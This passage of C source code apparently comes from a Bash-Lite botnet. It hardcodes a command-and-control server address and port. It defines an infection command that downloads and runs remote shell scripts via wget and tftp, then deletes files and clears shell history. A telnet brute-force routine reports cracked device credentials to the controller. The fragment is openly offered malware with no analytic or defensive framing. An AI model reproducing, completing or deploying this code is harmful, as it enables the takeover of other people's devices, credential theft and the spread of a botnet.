...
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = {"185.62.188.233 "};
int Server_Botport = 888;
char *infect = "cd /tmp || cd /var/run || cd /root || cd /; rm -rf Russ*; wget http://109.235.69.178/Russ.sh; chmod +x Russ.sh; sh Russ.sh; tftp 109.235.69.178 -c get tftp11.sh; chmod +x tftp11.sh; sh tftp11.sh; tftp -r tftp22.sh -g 109.235.69.178; chmod +x tftp22.sh; sh tftp22.sh;rm -rf *;history -c\r\n";
//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
...
sockprintf(mainCommSock, "\x1b[31m[Bash-Lite] \x1b[32mCracked [%s] [%s:%s]\x1b[0m", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
fds[i].state = 7; }
} else {
fds[i].state = 0;
fds[i].complete = 1;
